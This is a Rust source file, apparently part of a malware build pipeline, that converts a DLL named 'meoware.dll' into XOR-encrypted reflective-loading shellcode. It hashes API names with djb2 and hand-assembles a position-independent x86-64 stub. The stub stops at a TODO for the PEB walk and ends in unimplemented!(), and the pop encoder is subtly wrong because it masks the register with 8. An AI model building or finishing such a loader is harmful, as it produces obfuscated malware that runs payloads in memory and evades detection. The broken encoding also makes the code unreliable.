use std::path::PathBuf;


pub fn find_meoware_dll() -> Option<PathBuf> {
    let out = std::env::var("OUT_DIR").ok()?;
    let out_path = PathBuf::from(&out);
    let mut search = out_path.as_path();
    for _ in 0..5 {
        search = search.parent()?;
        let candidate = search.join("meoware.dll");
        if candidate.exists() { return Some(candidate); }
    }
    None
}

fn djb2(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &c in name {
        if c == 0 { break; }
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}


pub fn generate_reflective_shellcode(dll_bytes: &[u8], build_key: &[u8]) -> Vec<u8> {
    // Derive XOR key;
    let mut pk = [0u8; 16];
    for i in 0..16 {
        pk[i] = build_key[i % build_key.len()]
            .wrapping_add(build_key[(i + 7) % build_key.len()])
            .wrapping_mul(0x5A)
            .wrapping_add(i as u8 + 1);
        if pk[i] == 0 { pk[i] = 0x41; }
    }
    let enc: Vec<u8> = dll_bytes.iter().enumerate().map(|(i, b)| b ^ pk[i % 16]).collect();

    // Metadata header: [size:4][key:16][magic:4][pad:8] = 32 bytes
    let mut header = [0u8; 32];
    header[0..4].copy_from_slice(&(dll_bytes.len() as u32).to_le_bytes());
    header[4..20].copy_from_slice(&pk);
    header[20..24].copy_from_slice(&[0xFE, 0x11, 0x5C, 0x0D]);

    let h_gpa = djb2(b"GetProcAddress");

    // Build string table: null terminated ASCII strings after the stub
    let strings: Vec<(&str, Vec<u8>)> = vec![
        ("LoadLibraryA",   b"LoadLibraryA\0".to_vec()),
        ("VirtualAlloc",   b"VirtualAlloc\0".to_vec()),
        ("VirtualProtect", b"VirtualProtect\0".to_vec()),
    ];

    eprintln!("Hash: GetProcAddress=0x{:08X}", h_gpa);

    let (stub, str_offsets) = gen_stub(h_gpa, &strings);
    eprintln!("PIC stub: {} bytes, strings: {} bytes, DLL: {} bytes", stub.len(), str_offsets.1, enc.len());

    let mut sc = Vec::with_capacity(stub.len() + str_offsets.1 + 32 + enc.len());
    sc.extend_from_slice(&stub);
    // Sting table is already appended inside gen_stub
    // Append metadata + encrypted DLL
    sc.extend_from_slice(&header);
    sc.extend(&enc);
    sc
}

const RAX: u8 = 0;
const RCX: u8 = 1;
const RDX: u8 = 2;
const RBX: u8 = 3;
const RSP: u8 = 4;
const RBP: u8 = 5;
const RSI: u8 = 6;
const RDI: u8 = 7;
const R8 : u8 = 8;
const R9 : u8 = 9;
const R12: u8 = 12;
const R13: u8 = 13;
const R14: u8 = 14;
const R15: u8 = 15;

fn modrm(md: u8, reg: u8, rm: u8) -> u8 {
    (md << 6) | ((reg & 7) << 3) | (rm & 7)
}

// Emit REX prefix. w=64bit, r/b extend reg/rm fields
fn emit_rex(c: &mut Vec<u8>, w: bool, reg: u8, rm: u8) {
    let val = 0x40 
        | if w { 8 } else { 0 } 
        | ((reg >> 3) & 1) << 1
        | ((rm >> 3) & 1);
    if val != 0x40 || w { c.push(val) }
}

fn emit_modrm_mem(c: &mut Vec<u8>, reg: u8, base: u8, disp: i32) {
    if disp == 0 && (base & 7) != 5 { // mod=00 (means no disp), except rbp/r13
        c.push(modrm(0, reg, base));
        if (base & 7) == 4 { c.push(0x24) } // SIP for rsp/r12
    } else if disp >= -128 && disp <= 127 {
        c.push(modrm(1, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.push(disp as i8 as u8);
    } else {
        c.push(modrm(2, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.extend_from_slice(&disp.to_le_bytes());
    }
}

// push r64
fn push_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x50 + (reg & 7));
}

// Pop r64  
fn pop_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x58 + (reg & 8));
}


// mov r64, r64
fn mov_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x89);
    c.push(modrm(3, src, dst))
}

// sub r64, imm32
fn sub_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
    emit_rex(c, true, 5, dst); // /5 = sub
    c.push(0x81);
    c.push(modrm(3, 5, dst));
    c.extend_from_slice(&imm.to_le_bytes());
}

/**
 * PIC Stub Generator
 * */
fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, usize)) {
    let mut c: Vec<u8> = Vec::with_capacity(2048);

    // PROLOGUE
    c.extend_from_slice(&[0xE8, 0, 0, 0, 0]);               // call $+5
    pop_r(&mut c, RBX);                                     // pop rbx = address of this insn (byte 5)

    push_r(&mut c, RBP);
    mov_rr(&mut c, RBP, RSP);
    sub_ri(&mut c, RSP, 0x100); // 256 butes of locals
    push_r(&mut c, R12);
    push_r(&mut c, R13);
    push_r(&mut c, R14);
    push_r(&mut c, R15);
    push_r(&mut c, RSI);
    push_r(&mut c, RDI);

    // TODO: find kernel32 + GetProcAddress via PEB

    unimplemented!()
}